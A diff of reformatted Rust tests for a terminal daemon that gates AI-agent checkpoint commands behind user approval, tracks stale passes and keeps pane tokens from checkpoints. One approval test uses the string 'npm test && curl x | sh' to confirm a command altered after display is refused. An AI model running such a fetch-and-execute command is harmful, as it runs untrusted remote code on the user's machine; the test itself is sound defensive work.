     assert!(matches!(out.try_recv(), Ok(ServerMsg::Reply(Reply::Ok))));
-    assert_eq!(point(&d, t, "build").overridden_by, "reviewer", "None is the headline, and a pane signs with its name");
-    d.command(0, Command::UndoOverride { term: t, name: Some("test".into()) }).unwrap();
-    assert_eq!(states(&d, t), named_states(&[("build", CheckState::Overridden), ("test", CheckState::Failed)]));
+    assert_eq!(
+        point(&d, t, "build").overridden_by,
+        "reviewer",
+        "None is the headline, and a pane signs with its name"
+    );
+    d.command(
+        0,
+        Command::UndoOverride {
+            term: t,
+            name: Some("test".into()),
+        },
+    )
+    .unwrap();
+    assert_eq!(
+        states(&d, t),
+        named_states(&[
+            ("build", CheckState::Overridden),
+            ("test", CheckState::Failed)
+        ])
+    );
     close(&mut d, &[t, reviewer]);
 }
 
@@ -2835,29 +5262,82 @@ fn a_restart_restores_each_checkpoint_with_its_own_output() {
     let tails = persist::scratch_dir();
     d.check_dir = tails.path().to_path_buf();
     let old: TermId = 9_401;
-    let tail = |name: &str, slot, text: &str| persist::CheckTail { term: old, name: name.into(), slot, text: text.into() };
-    let written = [tail("build", persist::CheckSlot::Latest, "build out"), tail("build", persist::CheckSlot::Overridden, "build failed"), tail("test", persist::CheckSlot::Latest, "")];
-    assert!(persist::save_check_outputs(tails.path(), persist::save_ticket(), &written, &[old]).is_empty());
-    let info = |name: &str, state| CheckInfo { name: name.into(), command: format!("make {name}"), state, turn: 3, ..Default::default() };
+    let tail = |name: &str, slot, text: &str| persist::CheckTail {
+        term: old,
+        name: name.into(),
+        slot,
+        text: text.into(),
+    };
+    let written = [
+        tail("build", persist::CheckSlot::Latest, "build out"),
+        tail("build", persist::CheckSlot::Overridden, "build failed"),
+        tail("test", persist::CheckSlot::Latest, ""),
+    ];
+    assert!(
+        persist::save_check_outputs(tails.path(), persist::save_ticket(), &written, &[old])
+            .is_empty()
+    );
+    let info = |name: &str, state| CheckInfo {
+        name: name.into(),
+        command: format!("make {name}"),
+        state,
+        turn: 3,
+        ..Default::default()
+    };
     let saved = persist::SavedPane {
-        checks: vec![info("build", CheckState::Overridden), info("test", CheckState::Pending)],
+        checks: vec![
+            info("build", CheckState::Overridden),
+            info("test", CheckState::Pending),
+        ],
         checks_overridden: vec![info("build", CheckState::Overridden)],
         check_trees: [("build".to_string(), "4b825dc".to_string())].into(),
         ..Default::default()
     };
     let t = pane(&mut d);
     let dir = d.check_dir.clone();
-    d.terms.get_mut(&t).unwrap().restore_checks(&dir, old, &saved);
-    assert_eq!(states(&d, t), named_states(&[("build", CheckState::Overridden), ("test", CheckState::CouldNotRun)]), "a waiting one died with the server");
+    d.terms
+        .get_mut(&t)
+        .unwrap()
+        .restore_checks(&dir, old, &saved);
+    assert_eq!(
+        states(&d, t),
+        named_states(&[
+            ("build", CheckState::Overridden),
+            ("test", CheckState::CouldNotRun)
+        ]),
+        "a waiting one died with the server"
+    );
     let checks = &d.terms[&t].checks;
     assert_eq!(checks.named("build").unwrap().latest.output, "build out");
-    assert_eq!(checks.named("build").unwrap().overridden.as_ref().map(|o| o.output.as_str()), Some("build failed"));
+    assert_eq!(
+        checks
+            .named("build")
+            .unwrap()
+            .overridden
+            .as_ref()
+            .map(|o| o.output.as_str()),
+        Some("build failed")
+    );
     assert!(checks.named("test").unwrap().overridden.is_none());
     assert_eq!(checks.turn, 3, "the turn count carries on");
-    assert_eq!(checks.named("build").unwrap().tree.as_deref(), Some("4b825dc"), "its pass can still go stale");
+    assert_eq!(
+        checks.named("build").unwrap().tree.as_deref(),
+        Some("4b825dc"),
+        "its pass can still go stale"
+    );
     let mut written = d.take_dirty_check_outputs();
     written.sort_by(|a, b| (&a.name, a.slot as u8).cmp(&(&b.name, b.slot as u8)));
-    assert_eq!(written.iter().map(|w| (w.name.as_str(), w.text.as_str())).collect::<Vec<_>>(), [("build", "build out"), ("build", "build failed"), ("test", "")]);
+    assert_eq!(
+        written
+            .iter()
+            .map(|w| (w.name.as_str(), w.text.as_str()))
+            .collect::<Vec<_>>(),
+        [
+            ("build", "build out"),
+            ("build", "build failed"),
+            ("test", "")
+        ]
+    );
     close(&mut d, &[t]);
 }
 
@@ -2867,13 +5347,25 @@ fn a_checkpoint_never_sees_the_panes_token() {
     let _in_rt = rt.enter();
     // SAFETY: the daemon's own environment, as when it was started from inside a pane; the
     // panes it spawns set their own token.
-    unsafe { std::env::set_var(concat!(env!("APP_ENV"), "_PANE_TOKEN"), concat!(env!("APP_COMMAND"), "-test-secret")) };
-    let print = if cfg!(windows) { concat!("echo \"token=$env:", env!("APP_ENV"), "_PANE_TOKEN\"") } else { concat!("echo \"token=$", env!("APP_ENV"), "_PANE_TOKEN\"") };
+    unsafe {
+        std::env::set_var(
+            concat!(env!("APP_ENV"), "_PANE_TOKEN"),
+            concat!(env!("APP_COMMAND"), "-test-secret"),
+        )
+    };
+    let print = if cfg!(windows) {
+        concat!("echo \"token=$env:", env!("APP_ENV"), "_PANE_TOKEN\"")
+    } else {
+        concat!("echo \"token=$", env!("APP_ENV"), "_PANE_TOKEN\"")
+    };
     let t = agent_with_checkpoints(&mut d, &std::env::temp_dir(), &[("env", print)]);
     end_turn(&mut d, t);
     finish_run(&mut d, &mut rx, t);
     assert_eq!(point(&d, t, "env").state, CheckState::Passed);
-    assert_eq!(d.check_output(t, Some("env")).map(str::trim), Some("token="));
+    assert_eq!(
+        d.check_output(t, Some("env")).map(str::trim),
+        Some("token=")
+    );
     close(&mut d, &[t]);
 }
 
@@ -2881,7 +5373,12 @@ fn a_checkpoint_never_sees_the_panes_token() {
 fn temp_repo() -> persist::ScratchDir {
     let dir = persist::scratch_dir();
     std::fs::create_dir_all(dir.path()).unwrap();
-    for args in [&["init", "-q"][..], &["config", "user.name", "t"], &["config", "user.email", "t@t"], &["config", "core.autocrlf", "false"]] {
+    for args in [
+        &["init", "-q"][..],
+        &["config", "user.name", "t"],
+        &["config", "user.email", "t@t"],
+        &["config", "core.autocrlf", "false"],
+    ] {
         crate::proc::git(dir.path(), args).unwrap();
     }
     std::fs::write(dir.path().join("kept.txt"), "one\n").unwrap();
@@ -2893,7 +5390,11 @@ fn temp_repo() -> persist::ScratchDir {
 
 /// The git poll's stale probe, run here instead of on its background task.
 fn poll_stale(d: &mut Daemon) {
-    let found: Vec<_> = d.stale_probes().iter().flat_map(check_stale::probe).collect();
+    let found: Vec<_> = d
+        .stale_probes()
+        .iter()
+        .flat_map(check_stale::probe)
+        .collect();
     if !found.is_empty() {
         d.handle(Ev::ChecksStale(found));
     }
@@ -2904,43 +5405,89 @@ fn a_pass_goes_stale_when_the_files_change_and_a_failure_does_not() {
     let (rt, (mut d, mut rx)) = (runtime(), daemon());
     let _in_rt = rt.enter();
     let repo = temp_repo();
-    let t = agent_with_checkpoints(&mut d, repo.path(), &[("build", "echo built; exit 0"), ("test", "exit 1")]);
+    let t = agent_with_checkpoints(
+        &mut d,
+        repo.path(),
+        &[("build", "echo built; exit 0"), ("test", "exit 1")],
+    );
     end_turn(&mut d, t);
     finish_run(&mut d, &mut rx, t);
     poll_stale(&mut d);
     std::fs::write(repo.path().join("ignored.txt"), "local\n").unwrap();
     poll_stale(&mut d);
-    assert_eq!(states(&d, t), named_states(&[("build", CheckState::Passed), ("test", CheckState::Failed)]), "nothing that counts changed");
+    assert_eq!(
+        states(&d, t),
+        named_states(&[("build", CheckState::Passed), ("test", CheckState::Failed)]),
+        "nothing that counts changed"
+    );
     let staged = crate::proc::git(repo.path(), &["diff", "--cached", "--name-only"]).unwrap();
     std::fs::write(repo.path().join("kept.txt"), "two\n").unwrap();
     std::fs::write(repo.path().join("new.txt"), "new\n").unwrap();
     d.terms.get_mut(&t).unwrap().status = Status::Working;
     poll_stale(&mut d);
-    assert_eq!(point(&d, t, "build").state, CheckState::Passed, "not while the agent works");
+    assert_eq!(
+        point(&d, t, "build").state,
+        CheckState::Passed,
+        "not while the agent works"
+    );
     d.terms.get_mut(&t).unwrap().status = Status::Done;
     let before = term::unix_now();
     poll_stale(&mut d);
-    assert_eq!(states(&d, t), named_states(&[("build", CheckState::Stale), ("test", CheckState::Failed)]), "only a pass goes stale");
+    assert_eq!(
+        states(&d, t),
+        named_states(&[("build", CheckState::Stale), ("test", CheckState::Failed)]),
+        "only a pass goes stale"
+    );
     let build = point(&d, t, "build");
     assert!(build.stale_since.is_some_and(|at| at >= before));
-    let changed: Vec<_> = build.changed_files.iter().map(|f| (f.kind, f.path.as_str())).collect();
+    let changed: Vec<_> = build
+        .changed_files
+        .iter()
+        .map(|f| (f.kind, f.path.as_str()))
+        .collect();
     assert_eq!(changed, [('M', "kept.txt"), ('A', "new.txt")]);
-    assert_eq!(crate::proc::git(repo.path(), &["diff", "--cached", "--name-only"]).unwrap(), staged, "the real index is untouched");
-    d.command(0, Command::RerunCheck { term: t, name: Some("build".into()) }).unwrap();
+    assert_eq!(
+        crate::proc::git(repo.path(), &["diff", "--cached", "--name-only"]).unwrap(),
+        staged,
+        "the real index is untouched"
+    );
+    d.command(
+        0,
+        Command::RerunCheck {
+            term: t,
+            name: Some("build".into()),
+        },
+    )
+    .unwrap();
     finish_run(&mut d, &mut rx, t);
-    assert_eq!(point(&d, t, "build").state, CheckState::Passed, "a re-run replaces it");
+    assert_eq!(
+        point(&d, t, "build").state,
+        CheckState::Passed,
+        "a re-run replaces it"
+    );
     poll_stale(&mut d);
-    assert_eq!(point(&d, t, "build").state, CheckState::Passed, "fresh against the files as they are");
+    assert_eq!(
+        point(&d, t, "build").state,
+        CheckState::Passed,
+        "fresh against the files as they are"
+    );
     close(&mut d, &[t]);
 }
 
 #[test]
 fn a_stale_pass_counts_as_finished_but_not_as_a_fresh_pass() {
     let mut checks = check::Checks::default();
-    let info = CheckInfo { name: "test".into(), state: CheckState::Stale, ..Default::default() };
+    let info = CheckInfo {
+        name: "test".into(),
+        state: CheckState::Stale,
+        ..Default::default()
+    };
     checks.points.push(check::CheckRecord::new(info, "").into());
     assert!(!checks.holds_done() && !checks.running(), "finished");
-    assert_ne!(checks.headline().map(|c| c.info.state), Some(CheckState::Passed));
+    assert_ne!(
+        checks.headline().map(|c| c.info.state),
+        Some(CheckState::Passed)
+    );
 }
 
 #[test]
@@ -2969,7 +5516,12 @@ fn approving_daemon() -> (Daemon, mpsc::Receiver<Ev>, persist::ScratchDir) {
 
 /// Whatever the checks are, `test` waits for your approval again: so an answer's re-run
 /// starts and settles without running anything.
-fn still_waiting(user: &[crate::config::CheckDef], project: &std::path::Path, worktree: &std::path::Path, approvals: &approvals::Approvals) -> Vec<check_source::Resolved> {
+fn still_waiting(
+    user: &[crate::config::CheckDef],
+    project: &std::path::Path,
+    worktree: &std::path::Path,
+    approvals: &approvals::Approvals,
+) -> Vec<check_source::Resolved> {
     let mut all = check_source::resolve(user, project, worktree, approvals);
     for r in &mut all {
         r.gate = check_source::Gate::NeedsApproval { previous: None };
@@ -2979,7 +5531,12 @@ fn still_waiting(user: &[crate::config::CheckDef], project: &std::path::Path, wo
 
 /// Your answer to `t`'s checkpoint `name`, for the command `command` you were shown.
 fn approve(t: TermId, name: &str, choice: ApprovalChoice, command: &str) -> Command {
-    Command::ApproveCheck { term: t, name: name.into(), choice, command_sha256: approvals::command_hash(command) }
+    Command::ApproveCheck {
+        term: t,
+        name: name.into(),
+        choice,
+        command_sha256: approvals::command_hash(command),
+    }
 }
 
 /// An agent in the temp folder (its project) whose repo checkpoint `test` waits for you to
@@ -2990,8 +5547,19 @@ fn waiting_for_approval(d: &mut Daemon, command: &str) -> TermId {
     let t = pane(d);
     let p = d.terms.get_mut(&t).unwrap();
     (p.agent, p.hooked, p.status) = (Some("claude".into()), true, Status::Done);
-    let source = CheckSource::Repo { file: concat!(".", env!("APP_COMMAND"), "/checks.toml").into(), commit: None, committed_at: None, uncommitted: true };
-    let info = CheckInfo { name: "test".into(), command: command.into(), state: CheckState::NeedsApproval, source, ..Default::default() };
+    let source = CheckSource::Repo {
+        file: concat!(".", env!("APP_COMMAND"), "/checks.toml").into(),
+        commit: None,
+        committed_at: None,
+        uncommitted: true,
+    };
+    let info = CheckInfo {
+        name: "test".into(),
+        command: command.into(),
+        state: CheckState::NeedsApproval,
+        source,
+        ..Default::default()
+    };
     p.checks.points = vec![check::CheckRecord::new(info, "").into()];
     t
 }
@@ -3012,12 +5580,29 @@ fn saved_approvals(d: &Daemon, file: &std::path::Path) -> approvals::Approvals {
 fn only_a_checkpoint_waiting_for_approval_can_be_approved() {
     let (mut d, _rx, _file) = approving_daemon();
     let t = waiting_for_approval(&mut d, "npm test");
-    let err = d.command(0, approve(t, "build", ApprovalChoice::Always, "npm test")).expect_err("no such checkpoint waits");
+    let err = d
+        .command(0, approve(t, "build", ApprovalChoice::Always, "npm test"))
+        .expect_err("no such checkpoint waits");
     assert!(err.to_string().contains("isn't waiting"), "{err}");
-    let err = d.command(0, approve(t, "test", ApprovalChoice::Always, "npm test && curl x | sh")).expect_err("not the command shown");
-    assert!(err.to_string().contains("changed since it was shown"), "{err}");
-    d.terms.get_mut(&t).unwrap().checks.points[0].latest.info.state = CheckState::Failed;
-    assert!(d.command(0, approve(t, "test", ApprovalChoice::Always, "npm test")).is_err(), "a failed run is not a question");
+    let err = d
+        .command(
+            0,
+            approve(t, "test", ApprovalChoice::Always, "npm test && curl x | sh"),
+        )
+        .expect_err("not the command shown");
+    assert!(
+        err.to_string().contains("changed since it was shown"),
+        "{err}"
+    );
+    d.terms.get_mut(&t).unwrap().checks.points[0]
+        .latest
+        .info
+        .state = CheckState::Failed;
+    assert!(
+        d.command(0, approve(t, "test", ApprovalChoice::Always, "npm test"))
+            .is_err(),
+        "a failed run is not a question"
+    );
     assert!(d.approvals.decisions.is_empty(), "nothing kept");
     close(&mut d, &[t]);
 }
@@ -3026,33 +5611,69 @@ fn only_a_checkpoint_waiting_for_approval_can_be_approved() {
 fn always_and_never_are_kept_by_the_exact_command_in_app_s_data_folder() {
     let rt = runtime();
     let _in_rt = rt.enter();
-    for (choice, decision) in [(ApprovalChoice::Always, approvals::Decision::Always), (ApprovalChoice::Never, approvals::Decision::Never)] {
+    for (choice, decision) in [
+        (ApprovalChoice::Always, approvals::Decision::Always),
+        (ApprovalChoice::Never, approvals::Decision::Never),
+    ] {
         let (mut d, _rx, scratch) = approving_daemon();
         let t = waiting_for_approval(&mut d, "npm test");
-        d.command(0, approve(t, "TEST", choice, "npm test")).expect("an answer to what waits");
-        let kept = d.approvals.find(&std::env::temp_dir(), "test").cloned().expect("a decision");
-        assert_eq!((kept.name.as_str(), kept.command.as_str(), kept.decision), ("test", "npm test", decision));
+        d.command(0, approve(t, "TEST", choice, "npm test"))
+            .expect("an answer to what waits");
+        let kept = d
+            .approvals
+            .find(&std::env::temp_dir(), "test")
+            .cloned()
+            .expect("a decision");
+        assert_eq!(
+            (kept.name.as_str(), kept.command.as_str(), kept.decision),
+            ("test", "npm test", decision)
+        );
         assert_eq!(kept.command_sha256, approvals::command_hash("npm test"));
-        assert_eq!(saved_approvals(&d, &d.approvals_file.clone()).decisions, vec![kept], "saved off the loop");
+        assert_eq!(
+            saved_approvals(&d, &d.approvals_file.clone()).decisions,
+            vec![kept],
+            "saved off the loop"
+        );
         assert!(d.approvals_file.starts_with(scratch.path()));
         close(&mut d, &[t]);
     }
     let (d, _rx) = daemon();
-    assert_eq!(d.approvals_file, approvals::path(), concat!("outside every repo: ", env!("APP_NAME"), "'s own data folder"));
+    assert_eq!(
+        d.approvals_file,
+        approvals::path(),
+        concat!(
+            "outside every repo: ",
+            env!("APP_NAME"),
+            "'s own data folder"
+        )
+    );
     assert!(d.approvals_file.starts_with(crate::config::data_dir()));
 }
 
 #[test]
 fn once_lets_the_next_run_of_that_pane_go_and_then_asks_again() {
     let (mut d, _rx, _file) = approving_daemon();
-    let (t, other) = (waiting_for_approval(&mut d, "npm test"), waiting_for_approval(&mut d, "npm test"));
+    let (t, other) = (
+        waiting_for_approval(&mut d, "npm test"),
+        waiting_for_approval(&mut d, "npm test"),
+    );
     // While its agent works, the run the grant is for waits for the turn to end.
     d.terms.get_mut(&t).unwrap().status = Status::Working;
-    d.command(0, approve(t, "test", ApprovalChoice::Once, "npm test")).expect("an answer to what waits");
+    d.command(0, approve(t, "test", ApprovalChoice::Once, "npm test"))
+        .expect("an answer to what waits");
     assert!(d.approvals.decisions.is_empty(), "once is never remembered");
-    assert!(!d.approvals_for_run(other).granted_once("test", "npm test"), "another pane must ask for itself");
-    assert!(d.approvals_for_run(t).granted_once("test", "npm test"), "this pane's next run may go");
-    assert!(!d.approvals_for_run(t).granted_once("test", "npm test"), "and only that run");
+    assert!(
+        !d.approvals_for_run(other).granted_once("test", "npm test"),
+        "another pane must ask for itself"
+    );
+    assert!(
+        d.approvals_for_run(t).granted_once("test", "npm test"),
+        "this pane's next run may go"
+    );
+    assert!(
+        !d.approvals_for_run(t).granted_once("test", "npm test"),
+        "and only that run"
+    );
     close(&mut d, &[t, other]);
 }
 
@@ -3062,11 +5683,32 @@ fn forgetting_a_decision_makes_the_next_run_ask_again() {
     let _in_rt = rt.enter();
     let (mut d, _rx, _file) = approving_daemon();
     let repo = std::env::temp_dir();
-    d.approvals.decide(&repo, "test", "npm test", approvals::Decision::Never, 1);
-    d.command(0, Command::ForgetCheckApproval { project: repo.clone(), name: "test".into() }).expect("yours to forget");
+    d.approvals
+        .decide(&repo, "test", "npm test", approvals::Decision::Never, 1);
+    d.command(
+        0,
+        Command::ForgetCheckApproval {
+            project: repo.clone(),
+            name: "test".into(),
+        },
+    )
+    .expect("yours to forget");
     assert_eq!(d.approvals.lookup(&repo, "test", "npm test"), None);
-    assert!(saved_approvals(&d, &d.approvals_file.clone()).decisions.is_empty(), "and the file forgets it too");
-    let err = d.command(0, Command::ForgetCheckApproval { project: repo, name: "test".into() }).expect_err("nothing left");
+    assert!(
+        saved_approvals(&d, &d.approvals_file.clone())
+            .decisions
+            .is_empty(),
+        "and the file forgets it too"
+    );
+    let err = d
+        .command(
+            0,
+            Command::ForgetCheckApproval {
+                project: repo,
+                name: "test".into(),
+            },
+        )
+        .expect_err("nothing left");
     assert!(err.to_string().contains("nothing is remembered"), "{err}");
 }
 
@@ -3076,22 +5718,47 @@ fn a_repo_checkpoint_waits_at_the_turn_end_and_once_runs_it_one_time() {
     let _in_rt = rt.enter();
     let repo = temp_repo();
     std::fs::create_dir_all(repo.path().join(concat!(".", env!("APP_COMMAND")))).unwrap();
-    std::fs::write(repo.path().join(crate::config::REPO_CHECKS_FILE), "[[check]]\nname = \"test\"\ncommand = \"echo tested\"\n").unwrap();
+    std::fs::write(
+        repo.path().join(crate::config::REPO_CHECKS_FILE),
+        "[[check]]\nname = \"test\"\ncommand = \"echo tested\"\n",
+    )
+    .unwrap();
     let t = agent_with_checkpoints(&mut d, repo.path(), &[]);
     look_for_repo_checks(&mut d, &mut rx, t);
     let mut seen = viewer(&mut d);
     end_turn(&mut d, t);
-    assert!(d.terms[&t].check_running(), "the file is read off the loop; done waits for it");
+    assert!(
+        d.terms[&t].check_running(),
+        "the file is read off the loop; done waits for it"
+    );
     finish_run(&mut d, &mut rx, t);
-    assert_eq!(states(&d, t), named_states(&[("test", CheckState::NeedsApproval)]));
+    assert_eq!(
+        states(&d, t),
+        named_states(&[("test", CheckState::NeedsApproval)])
+    );
     assert!(announced(&heard(&mut seen), Status::Blocked));
-    d.command(0, approve(t, "test", ApprovalChoice::Once, "echo tested")).unwrap();
+    d.command(0, approve(t, "test", ApprovalChoice::Once, "echo tested"))
+        .unwrap();
     finish_run(&mut d, &mut rx, t);
     assert_eq!(states(&d, t), named_states(&[("test", CheckState::Passed)]));
-    assert_eq!(d.check_output(t, Some("test")).map(str::trim), Some("tested"));
-    d.command(0, Command::RerunCheck { term: t, name: None }).unwrap();
+    assert_eq!(
+        d.check_output(t, Some("test")).map(str::trim),
+        Some("tested")
+    );
+    d.command(
+        0,
+        Command::RerunCheck {
+            term: t,
+            name: None,
+        },
+    )
+    .unwrap();
     finish_run(&mut d, &mut rx, t);
-    assert_eq!(states(&d, t), named_states(&[("test", CheckState::NeedsApproval)]), "once was one run");
+    assert_eq!(
+        states(&d, t),
+        named_states(&[("test", CheckState::NeedsApproval)]),
+        "once was one run"
+    );
     close(&mut d, &[t]);
 }
 
@@ -3105,8 +5772,19 @@ fn approving_one_checkpoint_while_another_runs_runs_it_after_in_the_same_turn() 
     std::fs::write(repo.path().join(crate::config::REPO_CHECKS_FILE), file).unwrap();
     let t = agent_with_checkpoints(&mut d, repo.path(), &[]);
     look_for_repo_checks(&mut d, &mut rx, t);
-    let project = d.terms[&t].head.as_ref().expect("in the repo").main_root.clone();
-    d.approvals.decide(&project, "build", "echo built", approvals::Decision::Always, 1);
+    let project = d.terms[&t]
+        .head
+        .as_ref()
+        .expect("in the repo")
+        .main_root
+        .clone();
+    d.approvals.decide(
+        &project,
+        "build",
+        "echo built",
+        approvals::Decision::Always,
+        1,
+    );
     end_turn(&mut d, t);
     let until = Instant::now() + SLOW_CHECK_WAIT;
     loop {
@@ -3117,21 +5795,52 @@ fn approving_one_checkpoint_while_another_runs_runs_it_after_in_the_same_turn() 
             Err(_) => std::thread::sleep(Duration::from_millis(10)),
         }
     }
-    assert_eq!(states(&d, t), named_states(&[("build", CheckState::Checking), ("test", CheckState::NeedsApproval)]));
-    d.command(0, approve(t, "test", ApprovalChoice::Once, "echo tested")).expect("approving while build runs");
-    assert!(point(&d, t, "test").rerun_queued, "it runs once build is done");
+    assert_eq!(
+        states(&d, t),
+        named_states(&[
+            ("build", CheckState::Checking),
+            ("test", CheckState::NeedsApproval)
+        ])
+    );
+    d.command(0, approve(t, "test", ApprovalChoice::Once, "echo tested"))
+        .expect("approving while build runs");
+    assert!(
+        point(&d, t, "test").rerun_queued,
+        "it runs once build is done"
+    );
     finish_run(&mut d, &mut rx, t);
-    assert_eq!(states(&d, t), named_states(&[("build", CheckState::Passed), ("test", CheckState::Passed)]));
+    assert_eq!(
+        states(&d, t),
+        named_states(&[("build", CheckState::Passed), ("test", CheckState::Passed)])
+    );
     let test = point(&d, t, "test");
-    assert_eq!((test.turn, test.rerun_queued), (1, false), "in the same turn");
-    assert_eq!(d.check_output(t, Some("test")).map(str::trim), Some("tested"));
+    assert_eq!(
+        (test.turn, test.rerun_queued),
+        (1, false),
+        "in the same turn"
+    );
+    assert_eq!(
+        d.check_output(t, Some("test")).map(str::trim),
+        Some("tested")
+    );
     close(&mut d, &[t]);
 }
 
-
 /// A claude pane in its own workspace, and a connection that proved it is that pane.
-fn agent_pane_in(d: &mut Daemon, client: ClientId, dir: &std::path::Path) -> (TermId, mpsc::Receiver<ServerMsg>) {
-    d.command(0, Command::NewWorkspace { cwd: Some(dir.to_path_buf()), name: None, cmd: None }).unwrap();
+fn agent_pane_in(
+    d: &mut Daemon,
+    client: ClientId,
+    dir: &std::path::Path,
+) -> (TermId, mpsc::Receiver<ServerMsg>) {
+    d.command(
+        0,
+        Command::NewWorkspace {
+            cwd: Some(dir.to_path_buf()),
+            name: None,
+            cmd: None,
+        },
+    )
+    .unwrap();
     let term = d.workspaces.last().unwrap().tabs[0].focus;
     d.terms.get_mut(&term).unwrap().agent = Some("claude".into());
     let token = d.terms[&term].token.clone();
@@ -3139,10 +5848,28 @@ fn agent_pane_in(d: &mut Daemon, client: ClientId, dir: &std::path::Path) -> (Te
 }
 
 /// The pane's connection asks to start a session running `cmd`; what the daemon answered.
-fn helper_start(d: &mut Daemon, client: ClientId, c: &mut mpsc::Receiver<ServerMsg>, cmd: Option<&str>) -> Option<String> {
+fn helper_start(
+    d: &mut Daemon,
+    client: ClientId,
+    c: &mut mpsc::Receiver<ServerMsg>,
+    cmd: Option<&str>,
+) -> Option<String> {
     let cwd = Some(std::env::temp_dir());
-    d.handle(Ev::Msg(client, ClientMsg::Command(Command::NewWorkspace { cwd, name: None, cmd: cmd.map(String::from) })));
-    std::iter::from_fn(|| c.try_recv().ok()).find_map(|m| if let ServerMsg::Error(e) = m { Some(e) } else { None })
+    d.handle(Ev::Msg(
+        client,
+        ClientMsg::Command(Command::NewWorkspace {
+            cwd,
+            name: None,
+            cmd: cmd.map(String::from),
+        }),
+    ));
+    std::iter::from_fn(|| c.try_recv().ok()).find_map(|m| {
+        if let ServerMsg::Error(e) = m {
+            Some(e)
+        } else {
+            None
+        }
+    })
 }
 
 fn answer_helpers(term: TermId, choice: HelperChoice) -> Command {
@@ -3155,28 +5882,60 @@ fn the_first_helper_start_asks_and_the_row_needs_you_until_you_answer() {
     let (a, mut c) = agent_pane_in(&mut d, 1, &std::env::temp_dir());
     let panes = d.terms.len();
     // Nothing starts; the agent is told you were asked, and every task it names is listed once.
-    let why = helper_start(&mut d, 1, &mut c, Some("claude 'fix the login test'")).expect("refused for now");
-    assert!(why.contains("needs the user's OK") && why.contains("1 helper"), "{why}");
+    let why = helper_start(&mut d, 1, &mut c, Some("claude 'fix the login test'"))
+        .expect("refused for now");
+    assert!(
+        why.contains("needs the user's OK") && why.contains("1 helper"),
+        "{why}"
+    );
     helper_start(&mut d, 1, &mut c, Some("claude 'port the footer'"));
     helper_start(&mut d, 1, &mut c, Some("claude 'port the footer'"));
     assert_eq!(d.terms.len(), panes, "no session started");
-    assert_eq!(d.terms[&a].helpers.asked, ["fix the login test", "port the footer"]);
+    assert_eq!(
+        d.terms[&a].helpers.asked,
+        ["fix the login test", "port the footer"]
+    );
     let row = &d.snapshot().terms[&a];
-    assert_eq!((row.status, row.helper_ask.len()), (Status::Blocked, 2), "needs you, whatever its hooks say");
-    assert_ne!(d.terms[&a].status, Status::Blocked, "an overlay: the agent's own status is untouched");
+    assert_eq!(
+        (row.status, row.helper_ask.len()),
+        (Status::Blocked, 2),
+        "needs you, whatever its hooks say"
+    );
+    assert_ne!(
+        d.terms[&a].status,
+        Status::Blocked,
+        "an overlay: the agent's own status is untouched"
+    );
     // The pane cannot answer for you, and the ask stays.
-    d.handle(Ev::Msg(1, ClientMsg::Command(answer_helpers(a, HelperChoice::Allow))));
-    let refused = std::iter::from_fn(|| c.try_recv().ok()).find_map(|m| if let ServerMsg::Error(e) = m { Some(e) } else { None });
+    d.handle(Ev::Msg(
+        1,
+        ClientMsg::Command(answer_helpers(a, HelperChoice::Allow)),
+    ));
+    let refused = std::iter::from_fn(|| c.try_recv().ok()).find_map(|m| {
+        if let ServerMsg::Error(e) = m {
+            Some(e)
+        } else {
+            None
+        }
+    });
     assert!(refused.is_some_and(|e| e.contains("yours to allow")));
     assert_eq!(d.terms[&a].helpers.asked.len(), 2);
     // You allow: it may start them, now and for the rest of its run.
-    d.command(0, answer_helpers(a, HelperChoice::Allow)).unwrap();
+    d.command(0, answer_helpers(a, HelperChoice::Allow))
+        .unwrap();
     assert!(d.snapshot().terms[&a].helper_ask.is_empty() && !d.terms[&a].helpers.refused);
     assert!(helper_start(&mut d, 1, &mut c, None).is_none(), "allowed");
-    assert_eq!((d.terms.len(), d.terms[&newest(&d)].started_by), (panes + 1, Some(a)));
+    assert_eq!(
+        (d.terms.len(), d.terms[&newest(&d)].started_by),
+        (panes + 1, Some(a))
+    );
     // An answer to nothing is an error, not a grant.
     assert!(d.command(0, answer_helpers(a, HelperChoice::No)).is_err());
-    assert!(d.command(0, answer_helpers(999, HelperChoice::Allow)).is_err(), "no such pane");
+    assert!(
+        d.command(0, answer_helpers(999, HelperChoice::Allow))
+            .is_err(),
+        "no such pane"
+    );
     let all: Vec<TermId> = d.terms.keys().copied().collect();
     close(&mut d, &all);
 }
@@ -3188,10 +5947,20 @@ fn no_means_it_does_the_work_alone() {
     let panes = d.terms.len();
     helper_start(&mut d, 1, &mut c, Some("claude 'one'"));
     d.command(0, answer_helpers(a, HelperChoice::No)).unwrap();
-    assert_eq!(d.snapshot().terms[&a].status, d.terms[&a].status, "the row is back to what the agent says");
+    assert_eq!(
+        d.snapshot().terms[&a].status,
+        d.terms[&a].status,
+        "the row is back to what the agent says"
+    );
     let why = helper_start(&mut d, 1, &mut c, None).expect("refused");
-    assert!(why.contains("said no helpers") && why.contains("Do the work yourself"), "{why}");
-    assert!(d.terms[&a].helpers.asked.is_empty(), "it is not asked about again");
+    assert!(
+        why.contains("said no helpers") && why.contains("Do the work yourself"),
+        "{why}"
+    );
+    assert!(
+        d.terms[&a].helpers.asked.is_empty(),
+        "it is not asked about again"
+    );
     assert_eq!(d.terms.len(), panes);
     close(&mut d, &[a]);
 }
@@ -3209,11 +5978,18 @@ fn always_in_this_project_is_remembered_for_its_sessions_and_across_restarts() {
     let (b, mut cb) = agent_pane_in(&mut d, 2, &std::env::temp_dir());
     let (e, mut ce) = agent_pane_in(&mut d, 3, &other);
     helper_start(&mut d, 1, &mut ca, Some("claude 'one'"));
-    d.command(0, answer_helpers(a, HelperChoice::Always)).unwrap();
+    d.command(0, answer_helpers(a, HelperChoice::Always))
+        .unwrap();
     assert!(helper_start(&mut d, 1, &mut ca, None).is_none());
-    assert!(helper_start(&mut d, 2, &mut cb, None).is_none(), "another session in the same project doesn't ask");
+    assert!(
+        helper_start(&mut d, 2, &mut cb, None).is_none(),
+        "another session in the same project doesn't ask"
+    );
     assert!(d.terms[&b].helpers.asked.is_empty());
-    assert!(helper_start(&mut d, 3, &mut ce, Some("claude 'two'")).is_some(), "another project still asks");
+    assert!(
+        helper_start(&mut d, 3, &mut ce, Some("claude 'two'")).is_some(),
+        "another project still asks"
+    );
     assert_eq!(d.terms[&e].helpers.asked, ["two"]);
     // It is on disk, off the loop, by place not by spelling; a new daemon starts knowing it.
     let until = Instant::now() + Duration::from_secs(10);
@@ -3224,11 +6000,17 @@ fn always_in_this_project_is_remembered_for_its_sessions_and_across_restarts() {
         }
         std::thread::sleep(Duration::from_millis(10));
     };
